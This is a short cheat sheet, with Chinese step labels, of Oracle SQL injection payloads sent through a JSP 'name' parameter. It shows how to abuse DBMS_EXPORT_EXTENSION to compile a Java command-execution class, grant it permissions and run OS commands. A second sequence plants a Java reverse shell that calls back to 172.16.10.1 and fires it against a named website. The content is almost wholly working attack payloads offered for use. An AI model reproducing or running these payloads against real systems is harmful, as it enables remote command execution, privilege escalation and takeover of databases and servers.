`命令执行`

    创建JAVA代码
    /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual) is not null
    赋予JAVA执行权限
    /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
    创建函数
    /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
    赋予函数执行权限
    /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
    执行命令
    /oracle.jsp?name=' and (select sys.cmd('cmd.exe /c whoami') from dual) is not null--
    
    
`反弹Shell`
        
        创建JAVA代码
        /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell{public static void run() throws Exception {Socket s = new Socket("172.16.10.1", 80);Process p = Runtime.getRuntime().exec("cmd.exe");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) > 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}}'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
       赋予JAVA执行权限
       /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
       创建函数
       /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
       赋予函数执行权限
       /oracle.jsp?name=' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
       反弹SHELL  	
        http://www.iswin.org/oracle.jsp?name=' and (select sys.reversetcp from dual) is not null--






